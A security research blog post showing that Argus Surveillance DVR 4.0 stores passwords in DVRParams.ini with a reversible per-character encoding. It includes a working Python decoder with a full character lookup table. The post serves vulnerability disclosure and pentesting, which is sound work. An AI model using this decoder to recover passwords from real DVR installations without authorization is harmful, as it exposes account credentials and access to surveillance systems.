---
title: Cracking Argus Surveillance Passwords
tags: [Research, Exploit-Development]
style: outline
color: dark
comments: true
description: How to crack argus surveillance password hases
---

## Introduction

During a recent pentest I came across `Argus Surveillance DVR 4.0` which was using weak encryption for passwords.

## Discovery

`Argus Surveillance DVR 4.0` was storing the configuration in a file called `DVRParams.ini` located in `C:\ProgramData\PY_Software\Argus Surveillance DVR`

![location](https://i.imgur.com/KYcjQOM.png)

I've created a test account with username `test` and password `test`

![users](https://i.imgur.com/cbwtBsN.png)

The configuration was storing the user's password as a hash

![hash](https://i.imgur.com/d1PnFsd.png)

Something interesting caught my eye the first four characters and the last four characters in the hash were same `E03B` since my password was test where the first character and the last character are the same `t`

This confirms that `t=E03B`, I assumed that each character in password has 4 characters in the hash

![test](https://i.imgur.com/cZhNqwc.png)

Interesting let's change the password to `1234567890` (10 Characters)

![change_pass](https://i.imgur.com/trhdvQE.png)

Here's the new password hash in `DVRParams.ini`

![new_pass](https://i.imgur.com/NM50Tbq.png)

My assumption was correct since the password hash was exactly 40 characters long (10 * 4)

Similarly I changed the password to `abc...xyz` and `ABC...XYZ` and noted down the values for each character

Based on the above findings, I've written a simple script to decrypt the password hash

```python
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z'}

pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if (len(pass_hash)%4) != 0:
	print("[!] Error, check your password hash")
	exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
	split.append(pass_hash[index : index + n])

for key in split:
	if key in characters.keys():
		print("[+] " + key + ":" + characters[key])
	else:
		print("[-] " + key + ":Unknown")
```

Let's give it a spin!

![spin](https://i.imgur.com/9xcfb8S.png)

*Note:* replace the value of `pass_hash` in the script with the password hash you obtained from `DVRParams.ini`

